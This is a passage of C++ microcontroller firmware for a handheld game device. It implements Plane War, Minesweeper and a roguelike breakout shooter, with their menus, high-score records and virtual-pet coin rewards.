      plnExplosions[i].x = x; plnExplosions[i].y = y;
      plnExplosions[i].age = 0; plnExplosions[i].active = true;
      return;
    }
  }
}
void plnShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 24); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(plnData.bestScore), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Kills:", 4, 54);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(plnData.bestKills), 4, 68);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); waitExit();
}
void drawPlayerPlane(int x, int y, uint16_t color) {
  tft.fillTriangle(x + 6, y, x, y + 12, x + 12, y + 12, color);
  tft.fillRoundRect(x + 4, y + 8, 4, 5, 1, color);
  tft.fillRoundRect(x + 4, y + 3, 4, 5, 2, TFT_CYAN);
  tft.drawPixel(x + 6, y + 5, TFT_WHITE);
  tft.fillTriangle(x - 4, y + 8, x + 4, y + 6, x + 4, y + 10, color);
  tft.fillTriangle(x + 16, y + 8, x + 8, y + 6, x + 8, y + 10, color);
  tft.fillTriangle(x + 3, y + 12, x + 9, y + 12, x + 6, y + 15, color);
  tft.fillRect(x + 5, y + 14, 2, 2, TFT_YELLOW);
  tft.drawPixel(x + 5, y + 16, TFT_ORANGE);
  tft.drawPixel(x + 6, y + 16, TFT_ORANGE);
}
void drawEnemyPlane(int x, int y) {
  tft.fillTriangle(x + 6, y + 14, x, y + 2, x + 12, y + 2, TFT_RED);
  tft.fillRoundRect(x + 4, y + 1, 4, 5, 1, TFT_RED);
  tft.fillRoundRect(x + 4, y + 6, 4, 4, 2, TFT_DARKGREY);
  tft.drawPixel(x + 5, y + 8, TFT_WHITE);
  tft.drawPixel(x + 7, y + 8, TFT_WHITE);
  tft.fillTriangle(x - 4, y + 6, x + 4, y + 8, x + 4, y + 4, TFT_RED);
  tft.fillTriangle(x + 16, y + 6, x + 8, y + 8, x + 8, y + 4, TFT_RED);
  tft.fillTriangle(x + 3, y, x + 9, y, x + 6, y + 3, TFT_RED);
  tft.fillRect(x + 5, y + 12, 2, 3, TFT_ORANGE);
  tft.drawPixel(x + 5, y + 15, TFT_YELLOW);
  tft.drawPixel(x + 6, y + 15, TFT_YELLOW);
}
void plnGamePlay() {
  clearAll();
  int px = 74;
  int eX = 0, eY = 0;
  bool eActive = false;
  int bx[4], by[4]; bool bActive[4];
  for (int i = 0; i < 4; i++) bActive[i] = false;
  for (int i = 0; i < PLN_MAX_METEORS; i++) plnMeteors[i].active = false;
  for (int i = 0; i < PLN_MAX_EXPLOSIONS; i++) plnExplosions[i].active = false;
  int score = 0, kills = 0, lives = 3;
  unsigned long lastSpawn = millis(), lastMove = millis(), lastMeteorSpawn = millis();
  const int ENEMY_FALL_SPEED = 1;
  while (true) {
    char k = getGameKey();
    if (k == 'U') px -= 8;
    else if (k == 'D') px += 8;
    else if (k == 'L') {
      for (int i = 0; i < 4; i++) if (!bActive[i]) { bActive[i] = true; bx[i] = px + 5; by[i] = 56; break; }
    }
    else if (k == 'E') {
      if (score > plnData.bestScore) plnData.bestScore = score;
      if (kills > plnData.bestKills) plnData.bestKills = kills;
      plnSave(); return;
    }
    if (px < 4) px = 4; if (px > 144) px = 144;

    if (!eActive && millis() - lastSpawn > 1400) {
      lastSpawn = millis();
      int bestX = -1, bestDist = -1;
      for (int attempt = 0; attempt < 30; attempt++) {
        int candX = random(10, 140);
        bool ok = true;
        if (abs(candX - px) < 28) ok = false;
        if (ok) for (int m = 0; m < PLN_MAX_METEORS; m++)
          if (plnMeteors[m].active && abs(candX - plnMeteors[m].x) < 20) { ok = false; break; }
        if (ok) { eX = candX; eY = -14; eActive = true; break; }
        int d = abs(candX - px);
        for (int m = 0; m < PLN_MAX_METEORS; m++)
          if (plnMeteors[m].active) { int md = abs(candX - plnMeteors[m].x); if (md < d) d = md; }
        if (d > bestDist) { bestDist = d; bestX = candX; }
      }
      if (!eActive && bestX >= 0) { eX = bestX; eY = -14; eActive = true; }
    }
    if (millis() - lastMeteorSpawn > 2200) {
      lastMeteorSpawn = millis();
      for (int i = 0; i < PLN_MAX_METEORS; i++) if (!plnMeteors[i].active) {
        int bestX = -1, bestDist = -1;
        for (int attempt = 0; attempt < 20; attempt++) {
          int candX = random(10, 150);
          bool ok = true;
          if (abs(candX - px) < 34) ok = false;
          if (ok && eActive && abs(candX - eX) < 24) ok = false;
          if (ok) for (int m = 0; m < PLN_MAX_METEORS; m++)
            if (plnMeteors[m].active && abs(candX - plnMeteors[m].x) < 22) { ok = false; break; }
          if (ok) {
            plnMeteors[i].active = true;
            plnMeteors[i].x = candX; plnMeteors[i].y = -10;
            plnMeteors[i].r = random(3, 5);
            break;
          }
          int d = abs(candX - px);
          for (int m = 0; m < PLN_MAX_METEORS; m++)
            if (plnMeteors[m].active) { int md = abs(candX - plnMeteors[m].x); if (md < d) d = md; }
          if (d > bestDist) { bestDist = d; bestX = candX; }
        }
        if (!plnMeteors[i].active && bestX >= 0) {
          plnMeteors[i].active = true;
          plnMeteors[i].x = bestX; plnMeteors[i].y = -10;
          plnMeteors[i].r = random(3, 5);
        }
      }
    }
    if (millis() - lastMove > 50) {
      lastMove = millis();
      if (eActive) eY += ENEMY_FALL_SPEED;
      for (int i = 0; i < PLN_MAX_METEORS; i++) if (plnMeteors[i].active) plnMeteors[i].y += 2;
      for (int i = 0; i < 4; i++) if (bActive[i]) {
        by[i] -= 5;
        if (by[i] < 0) bActive[i] = false;
      }
    }
    if (eActive && eY > 68) { eActive = false; lives--; }
    for (int i = 0; i < PLN_MAX_METEORS; i++)
      if (plnMeteors[i].active && plnMeteors[i].y > 78) plnMeteors[i].active = false;

    if (lives <= 0) {
      if (score > plnData.bestScore) plnData.bestScore = score;
      if (kills > plnData.bestKills) plnData.bestKills = kills;
      plnSave();
      gameReward(score/3+3);
      pet2TaskAdd(6, 1); pet2TaskSet(7, score);
      clearAll();
      tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 15, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("Score: " + String(score), 4, 35);
      tft.drawString("Kills: " + String(kills), 4, 49);
      while (true) { char kk = getKey(); if (kk == 'R' || kk == 'E') break; delay(20); }
      return;
    }

    if (eActive) {
      for (int i = 0; i < 4; i++) if (bActive[i]) {
        if (bx[i] >= eX && bx[i] <= eX + 12 && by[i] >= eY && by[i] <= eY + 14) {
          bActive[i] = false; eActive = false;
          plnSpawnExplosion(eX + 6, eY + 7);
          score += 10; kills++;
          break;
        }
      }
    }
    for (int i = 0; i < 4; i++) if (bActive[i]) {
      for (int j = 0; j < PLN_MAX_METEORS; j++) if (plnMeteors[j].active) {
        int dx = bx[i] - plnMeteors[j].x, dy = by[i] - plnMeteors[j].y;
        if (dx*dx + dy*dy <= plnMeteors[j].r * plnMeteors[j].r + 4) {
          bActive[i] = false;
          int mx = plnMeteors[j].x, my = plnMeteors[j].y;
          plnSpawnExplosion(mx, my);
          plnMeteors[j].active = false;
          score += 5;
          if (eActive) {
            int ex2 = eX + 6, ey2 = eY + 7;
            int ddx = ex2 - mx, ddy = ey2 - my;
            if (ddx*ddx + ddy*ddy < 40*40) {
              plnSpawnExplosion(ex2, ey2);
              eActive = false;
              score += 20; kills++;
            }
          }
          break;
        }
      }
    }
    for (int j = 0; j < PLN_MAX_METEORS; j++) if (plnMeteors[j].active) {
      if (plnMeteors[j].x >= px && plnMeteors[j].x <= px + 12 &&
          plnMeteors[j].y >= 54 && plnMeteors[j].y <= 70) {
        plnSpawnExplosion(plnMeteors[j].x, plnMeteors[j].y);
        plnMeteors[j].active = false;
        lives--;
      }
    }

    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString("S:" + String(score) + " L:" + String(lives), 2, 0);
    drawPlayerPlane(px, 54, TFT_GREEN);
    for (int i = 0; i < 4; i++) if (bActive[i]) { tft.fillRect(bx[i] - 1, by[i], 2, 4, TFT_YELLOW); tft.drawPixel(bx[i], by[i] + 4, TFT_ORANGE); }
    if (eActive) drawEnemyPlane(eX, eY);
    for (int j = 0; j < PLN_MAX_METEORS; j++) if (plnMeteors[j].active) {
      int mx = plnMeteors[j].x, my = plnMeteors[j].y, mr = plnMeteors[j].r;
      tft.fillCircle(mx, my, mr, 0x8410);
      tft.drawCircle(mx, my, mr, 0xC618);
      tft.drawPixel(mx - 1, my - 1, TFT_WHITE);
    }
    for (int i = 0; i < PLN_MAX_EXPLOSIONS; i++) if (plnExplosions[i].active) {
      int age = plnExplosions[i].age;
      int ex0 = plnExplosions[i].x, ey0 = plnExplosions[i].y;
      if (age < 3) {
        tft.fillCircle(ex0, ey0, 5 - age, TFT_YELLOW);
        tft.drawCircle(ex0, ey0, 6 - age, TFT_ORANGE);
      } else if (age < 6) {
        tft.drawCircle(ex0, ey0, 5 - (age - 3), TFT_RED);
      } else {
        plnExplosions[i].active = false;
      }
      plnExplosions[i].age++;
    }
    delay(30);
  }
}
void showPlaneWar() {
  deinitWifi(); deinitBLE(); plnLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Plane War", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) { String pre = (i == menuSel) ? "> " : "  "; tft.drawString(pre + items[i], 2, 20 + i * 14); }
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') {
      if (menuSel == 0) plnGamePlay();
      else if (menuSel == 1) plnShowRecords();
      plnLoad();
    } else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================== 扫雷 ====================
int minGrid[9][9];
bool minRevealed[9][9];
bool minFlag[9][9];
int minCursorX = 0, minCursorY = 0;
unsigned long minStartTime = 0;
bool minFirst = true;
const uint8_t digit3x5[9][5] = {
  {0b111, 0b101, 0b101, 0b101, 0b111},
  {0b010, 0b110, 0b010, 0b010, 0b111},
  {0b111, 0b001, 0b111, 0b100, 0b111},
  {0b111, 0b001, 0b111, 0b001, 0b111},
  {0b101, 0b101, 0b111, 0b001, 0b001},
  {0b111, 0b100, 0b111, 0b001, 0b111},
  {0b111, 0b100, 0b111, 0b101, 0b111},
  {0b111, 0b001, 0b010, 0b010, 0b010},
  {0b111, 0b101, 0b111, 0b101, 0b111},
};
void drawDigit3x5(int x, int y, int digit, uint16_t color) {
  if (digit < 0 || digit > 8) return;
  for (int row = 0; row < 5; row++) {
    uint8_t bits = digit3x5[digit][row];
    for (int col = 0; col < 3; col++) {
      if (bits & (0b100 >> col)) tft.drawPixel(x + col, y + row, color);
    }
  }
}
void minGenerate(int sx, int sy) {
  for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) { minGrid[y][x] = 0; minRevealed[y][x] = false; minFlag[y][x] = false; }
  int placed = 0;
  while (placed < 45) {
    int x = random(9), y = random(9);
    if (minGrid[y][x] == -1) continue;
    if (abs(x - sx) <= 1 && abs(y - sy) <= 1) continue;
    minGrid[y][x] = -1; placed++;
  }
  for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) {
    if (minGrid[y][x] == -1) continue;
    int c = 0;
    for (int dy = -1; dy <= 1; dy++) for (int dx = -1; dx <= 1; dx++) {
      int nx = x + dx, ny = y + dy;
      if (nx < 0 || nx >= 9 || ny < 0 || ny >= 9) continue;
      if (minGrid[ny][nx] == -1) c++;
    }
    minGrid[y][x] = c;
  }
}
void minRevealFlood(int x, int y) {
  if (x < 0 || x >= 9 || y < 0 || y >= 9) return;
  if (minRevealed[y][x] || minFlag[y][x]) return;
  minRevealed[y][x] = true;
  if (minGrid[y][x] == 0) for (int dy = -1; dy <= 1; dy++) for (int dx = -1; dx <= 1; dx++) minRevealFlood(x + dx, y + dy);
}
void minDraw() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  int remaining = 0;
  for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) if (minGrid[y][x] == -1 && !minFlag[y][x]) remaining++;
  char info[24]; snprintf(info, sizeof(info), "M:%d T:%lu", remaining, (millis() - minStartTime) / 1000);
  tft.drawString(info, 2, 0);
  int cellW = 13, cellH = 6;
  int ox = (160 - 9 * cellW) / 2;
  for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) {
    int px = ox + x * cellW, py = 22 + y * cellH;
    if (minRevealed[y][x]) {
      tft.fillRect(px, py, cellW - 1, cellH - 1, 0x0000);
      if (minGrid[y][x] == -1) tft.fillRect(px + 3, py + 1, 5, 4, TFT_RED);
      else if (minGrid[y][x] > 0) {
        uint16_t col;
        switch (minGrid[y][x]) {
          case 1: col = TFT_BLUE; break; case 2: col = TFT_GREEN; break;
          case 3: col = TFT_RED; break; case 4: col = TFT_MAGENTA; break;
          case 5: col = TFT_ORANGE; break; case 6: col = TFT_CYAN; break;
          default: col = TFT_YELLOW; break;
        }
        drawDigit3x5(px + (cellW - 3) / 2, py + 1, minGrid[y][x], col);
      }
    } else if (minFlag[y][x]) {
      tft.fillRect(px, py, cellW - 1, cellH - 1, TFT_RED);
      tft.drawLine(px + 2, py + 1, px + 2, py + 5, TFT_WHITE);
      tft.fillTriangle(px + 2, py + 1, px + 7, py + 2, px + 2, py + 4, TFT_YELLOW);
    } else {
      tft.fillRect(px, py, cellW - 1, cellH - 1, 0x8410);
    }
    if (x == minCursorX && y == minCursorY) tft.drawRect(px - 1, py - 1, cellW + 1, cellH + 1, TFT_YELLOW);
  }
}
void minGamePlay() {
  minFirst = true;
  minStartTime = millis();
  minCursorX = 0; minCursorY = 0;
  for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) { minGrid[y][x] = 0; minRevealed[y][x] = false; minFlag[y][x] = false; }
  minDraw();
  while (true) {
    char k = getGameKey();
    if (k == 'E') break;
    if (k == 'U') { minCursorX--; if (minCursorX < 0) minCursorX = 8; }
    else if (k == 'D') {
      minCursorX++;
      if (minCursorX > 8) { minCursorX = 0; minCursorY++; if (minCursorY > 8) minCursorY = 0; }
    }
    else if (k == 'L') {
      if (minFirst) { minGenerate(minCursorX, minCursorY); minFirst = false; }
      if (!minFlag[minCursorY][minCursorX]) minRevealFlood(minCursorX, minCursorY);
    }
    else if (k == 'R') { minFlag[minCursorY][minCursorX] = !minFlag[minCursorY][minCursorX]; }
    bool win = true;
    for (int y = 0; y < 9; y++) for (int x = 0; x < 9; x++) {
      if (minGrid[y][x] == -1) continue;
      if (!minRevealed[y][x]) { win = false; break; }
    }
    if (win) {
      uint16_t t = (millis() - minStartTime) / 1000;
      if (minData.bestTime == 0 || t < minData.bestTime) minData.bestTime = t;
      minSave();
      gameReward(10+5); pet2TaskAdd(6, 1);
      clearAll();
      tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("WIN!", 80, 20, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("Time: " + String(t) + "s", 4, 40);
      while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
      return;
    }
    if (minRevealed[minCursorY][minCursorX] && minGrid[minCursorY][minCursorX] == -1) {
      clearAll();
      tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("BOOM!", 80, 20, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
      return;
    }
    minDraw();
    delay(30);
  }
}
void minShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Time:", 4, 30);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(minData.bestTime) + "s", 4, 44);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); waitExit();
}
void showMinesweeper() {
  deinitWifi(); deinitBLE(); minLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Minesweeper", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) { String pre = (i == menuSel) ? "> " : "  "; tft.drawString(pre + items[i], 2, 20 + i * 14); }
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') {
      if (menuSel == 0) minGamePlay();
      else if (menuSel == 1) minShowRecords();
      minLoad();
    } else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================== Roguelike Breakout ====================
struct RogBrick { int x; int y; int hp; bool active; };
RogBrick rogBricks[24];
int rogBrickCount = 0;
int rogLevel = 1, rogExp = 0, rogScore = 0;
int rogDamage = 1, rogFireRate = 600, rogBulletCount = 1, rogBulletSpeed = 3, rogPierce = 0;
int rogMultiShot = 0, rogCrit = 0, rogLifeSteal = 0;
int rogCannonX = 74;
unsigned long rogStartTime = 0, rogLastSpawn = 0, rogLastMove = 0, rogLastShoot = 0;
int rogMoveInterval = 1000;
int rogExpNeeded() {
  double e = 15.0 * pow(1.5, rogLevel - 1);
  if (e > 100000.0) e = 100000.0;
  return (int)e;
}
void rogSpawnRow() {
  int n = 0;
  for (int i = 0; i < rogBrickCount; i++) {
    if (rogBricks[i].active) {
      if (n != i) rogBricks[n] = rogBricks[i];
      n++;
    }
  }
  rogBrickCount = n;
  bool rowExists = false;
  for (int i = 0; i < rogBrickCount; i++)
    if (rogBricks[i].active && rogBricks[i].y <= 18) { rowExists = true; break; }
  if (rowExists) return;
  int cellW = 19, startX = 4;
  int elapsedSec = (millis() - rogStartTime) / 1000;
  int hpBase;
  if      (elapsedSec <  60) hpBase = 1 + elapsedSec / 30;
  else if (elapsedSec < 120) hpBase = 3 + (elapsedSec -  60) / 20;
  else if (elapsedSec < 240) hpBase = 6 + (elapsedSec - 120) / 15;
  else if (elapsedSec < 360) hpBase = 14 + (elapsedSec - 240) / 12;
  else                       hpBase = 24 + (elapsedSec - 360) / 10;
  if (hpBase > 99) hpBase = 99;
  for (int i = 0; i < 8; i++) {
    if (rogBrickCount >= 24) break;
    rogBricks[rogBrickCount].x = startX + i * cellW;
    rogBricks[rogBrickCount].y = 14;
    int hp = hpBase + random(-1, 2);
    if (hp < 1) hp = 1;
    rogBricks[rogBrickCount].hp = hp;
    rogBricks[rogBrickCount].active = true;
    rogBrickCount++;
  }
}
void rogDraw() {
  tft.fillRect(0, 13, 160, 67, TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[40]; snprintf(buf, sizeof(buf), "Lv:%d Exp:%d/%d", rogLevel, rogExp, rogExpNeeded());
  tft.drawString(buf, 2, 0);
  snprintf(buf, sizeof(buf), "S:%d", rogScore);
  tft.drawString(buf, 130, 0);
  for (int i = 0; i < rogBrickCount; i++) {
    if (!rogBricks[i].active) continue;
    int hpv = rogBricks[i].hp;
    uint16_t c;
    if      (hpv >= 15) c = 0xA000;
    else if (hpv >=  8) c = TFT_RED;
    else if (hpv >=  4) c = TFT_ORANGE;
    else if (hpv >=  2) c = TFT_YELLOW;
    else                c = TFT_GREEN;
    tft.fillRect(rogBricks[i].x, rogBricks[i].y, 17, 6, c);
    tft.drawRect(rogBricks[i].x, rogBricks[i].y, 17, 6, TFT_WHITE);
    if (rogBricks[i].hp > 1) {
      char hb[4]; snprintf(hb, sizeof(hb), "%d", rogBricks[i].hp);
      tft.setTextColor(TFT_BLACK, c);
      tft.drawCentreString(hb, rogBricks[i].x + 8, rogBricks[i].y, 1);
    }
  }
  tft.drawFastHLine(0, 62, 160, TFT_RED);
  tft.fillRoundRect(rogCannonX, 68, 12, 6, 2, TFT_CYAN);
  tft.fillRect(rogCannonX + 4, 66, 4, 3, TFT_CYAN);
  tft.fillRect(rogCannonX + 1, 74, 3, 2, TFT_DARKGREY);
  tft.fillRect(rogCannonX + 8, 74, 3, 2, TFT_DARKGREY);
}

enum RogUp { RU_FIRE, RU_DMG, RU_BULLET, RU_SPEED, RU_PIERCE, RU_MULTI, RU_CRIT, RU_LIFE };
struct RogUpgradeDef { const char* name; uint8_t type; };
const RogUpgradeDef ROG_UPGRADES[] = {
  {"FireRate -150", RU_FIRE},
  {"Damage   +1",   RU_DMG},
  {"Bullet   +1",   RU_BULLET},
  {"Speed    +1",   RU_SPEED},
  {"Pierce   +1",   RU_PIERCE},
  {"Multi-Shot",    RU_MULTI},
  {"Crit +15%",     RU_CRIT},
  {"Life Steal",    RU_LIFE}
};
const int ROG_UPGRADE_COUNT = 8;

void rogUpgradeMenu() {
  delay(200);
  bool upHeld   = (digitalRead(BTN_UP)   == LOW);
  bool downHeld = (digitalRead(BTN_DOWN) == LOW);
  bool leftHeld = (digitalRead(BTN_LEFT) == LOW);
  int pool[ROG_UPGRADE_COUNT];
  for (int i = 0; i < ROG_UPGRADE_COUNT; i++) pool[i] = i;
  for (int i = ROG_UPGRADE_COUNT - 1; i > 0; i--) {
    int j = random(i + 1);
    int t = pool[i]; pool[i] = pool[j]; pool[j] = t;
  }
  int choices[3] = { pool[0], pool[1], pool[2] };
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawCentreString("LEVEL UP!", 80, 16, 1);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);  tft.drawCentreString("Choose upgrade", 80, 28, 1);
    for (int i = 0; i < 3; i++) {
      String pre = (i == sel) ? "> " : "  ";
      tft.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE, TFT_BLACK);
      tft.drawString(pre + String(ROG_UPGRADES[choices[i]].name), 2, 44 + i * 12);
    }
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    bool upNow   = (digitalRead(BTN_UP)   == LOW);
    bool downNow = (digitalRead(BTN_DOWN) == LOW);
    bool leftNow = (digitalRead(BTN_LEFT) == LOW);
    if      (upNow   && !upHeld)   sel = (sel + 2) % 3;
    else if (downNow && !downHeld) sel = (sel + 1) % 3;
    else if (leftNow && !leftHeld) {
      switch (ROG_UPGRADES[choices[sel]].type) {
        case RU_FIRE:   if (rogFireRate > 150) rogFireRate -= 150; break;
        case RU_DMG:    rogDamage++; break;
        case RU_BULLET: if (rogBulletCount < 5) rogBulletCount++; break;
        case RU_SPEED:  rogBulletSpeed++; break;
        case RU_PIERCE: rogPierce++; break;
        case RU_MULTI:  rogMultiShot++; break;
        case RU_CRIT:   rogCrit += 15; break;
        case RU_LIFE:   rogLifeSteal++; break;
      }
      delay(200);
      return;
    }
    upHeld = upNow; downHeld = downNow; leftHeld = leftNow;
    delay(30);
  }
}

// 子弹现在带独立穿透次数（rogPierce 变为发射时的初始穿透）
struct RogBullet { int x, y, pierce; };
void rogGamePlay() {
  clearAll();
  rogLevel = 1; rogExp = 0; rogScore = 0;
  rogDamage = 1; rogFireRate = 600; rogBulletCount = 1; rogBulletSpeed = 3; rogPierce = 0;
  rogMultiShot = 0; rogCrit = 0; rogLifeSteal = 0;
  rogCannonX = 74; rogBrickCount = 0;
  rogStartTime = millis();
  rogLastSpawn = millis(); rogLastMove = millis(); rogLastShoot = 0;
  rogMoveInterval = 1000;
  RogBullet bullets[8]; int bCount = 0;
  while (true) {
    char k = getGameKey();
    if (k == 'E') break;
    if (digitalRead(BTN_UP) == LOW) rogCannonX -= 4;
    if (digitalRead(BTN_DOWN) == LOW) rogCannonX += 4;
    if (rogCannonX < 0) rogCannonX = 0;
    if (rogCannonX > 148) rogCannonX = 148;
    if (digitalRead(BTN_LEFT) == LOW) {
      if (millis() - rogLastShoot > (unsigned long)rogFireRate) {
        rogLastShoot = millis();
        int spawnX[5]; int spawnCount = 0;
        if (rogBulletCount == 1) {
          spawnX[spawnCount++] = rogCannonX + 5;
        } else if (rogBulletCount == 2) {
          spawnX[spawnCount++] = rogCannonX + 2;
          spawnX[spawnCount++] = rogCannonX + 8;
        } else {
          spawnX[spawnCount++] = rogCannonX + 5;
          spawnX[spawnCount++] = rogCannonX + 1;
          spawnX[spawnCount++] = rogCannonX + 9;
        }
        for (int s = 0; s < spawnCount; s++) {
          if (bCount < 8) {
            bullets[bCount].x = spawnX[s];
            bullets[bCount].y = 66;
            bullets[bCount].pierce = rogPierce;
            bCount++;
          }
        }
        for (int m = 0; m < rogMultiShot; m++) {
          if (bCount < 8) {
            bullets[bCount].x = rogCannonX + 5;
            bullets[bCount].y = 65 - m;
            bullets[bCount].pierce = rogPierce;
            bCount++;
          }
        }
      }
    }
    if (millis() - rogLastSpawn > 3500) { rogLastSpawn = millis(); rogSpawnRow(); }
    {
      int elapsedSec = (millis() - rogStartTime) / 1000;
      int timeInterval  = (int)(1000.0 * pow(0.996, elapsedSec));
      int levelInterval = 1000 - (rogLevel - 1) * 25;
      int baseInterval  = (timeInterval < levelInterval) ? timeInterval : levelInterval;
      if (baseInterval < 300) baseInterval = 300;
      rogMoveInterval = baseInterval;
    }
    if (millis() - rogLastMove > (unsigned long)rogMoveInterval) {
      rogLastMove = millis();
      for (int i = 0; i < rogBrickCount; i++) if (rogBricks[i].active) rogBricks[i].y += 1;
    }
    for (int i = 0; i < bCount; i++) {
      bullets[i].y -= rogBulletSpeed;
      if (bullets[i].y < 13) { bullets[i].y = -100; continue; }
      for (int j = 0; j < rogBrickCount; j++) {
        if (!rogBricks[j].active) continue;
        if (bullets[i].x >= rogBricks[j].x && bullets[i].x <= rogBricks[j].x + 17 &&
            bullets[i].y >= rogBricks[j].y && bullets[i].y <= rogBricks[j].y + 6) {
          int dmg = rogDamage;
          if (rogCrit > 0 && random(100) < rogCrit) dmg *= 2;
          rogBricks[j].hp -= dmg;
          if (rogBricks[j].hp <= 0) {
            rogBricks[j].active = false;
            rogScore += 10; rogExp += 5;
            if (rogLifeSteal > 0) rogExp += rogLifeSteal;
            while (rogExp >= rogExpNeeded()) { rogExp -= rogExpNeeded(); rogLevel++; pet2AddExp(5); rogUpgradeMenu(); }
          }
          // 每颗子弹独立穿透：消耗自己携带的 pierce
          if (bullets[i].pierce > 0) bullets[i].pierce--;
          else { bullets[i].y = -100; break; }
        }
      }
    }
    int nb = 0;
    for (int i = 0; i < bCount; i++) if (bullets[i].y >= 13) { bullets[nb] = bullets[i]; nb++; }
    bCount = nb;
    for (int i = 0; i < rogBrickCount; i++) {
      if (rogBricks[i].active && rogBricks[i].y + 6 >= 62) {
        if (rogScore > rogData.bestScore) rogData.bestScore = rogScore;
        if (rogLevel > rogData.bestLevel) rogData.bestLevel = rogLevel;
        rogSave();
        gameReward(rogScore/30+rogLevel);
        pet2TaskAdd(6, 1); pet2TaskSet(7, rogScore);
        clearAll();
        tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString("Level: " + String(rogLevel), 4, 28);
        tft.drawString("Score: " + String(rogScore), 4, 42);
        while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
        return;
      }
    }
    rogDraw();
    for (int i = 0; i < bCount; i++) tft.fillRect(bullets[i].x, bullets[i].y, 2, 3, TFT_YELLOW);
    delay(15);
  }
}
void rogShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 24); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(rogData.bestScore), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Level:", 4, 54);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(rogData.bestLevel), 4, 68);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); waitExit();
}
void showRoguelike() {
  deinitWifi(); deinitBLE(); rogLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Roguelike", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) { String pre = (i == menuSel) ? "> " : "  "; tft.drawString(pre + items[i], 2, 20 + i * 14); }
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') {
      if (menuSel == 0) rogGamePlay();
      else if (menuSel == 1) rogShowRecords();
      rogLoad();
    } else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}
// ==================== 菜单绘制与交互 ====================
void drawGameMenu() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Games", 2, 0);
  if (gameOffset > gameMenuCount - 4) gameOffset = gameMenuCount - 4;
  if (gameOffset < 0) gameOffset = 0;
  for (int i = gameOffset; i < gameOffset + 4 && i < gameMenuCount; i++) {
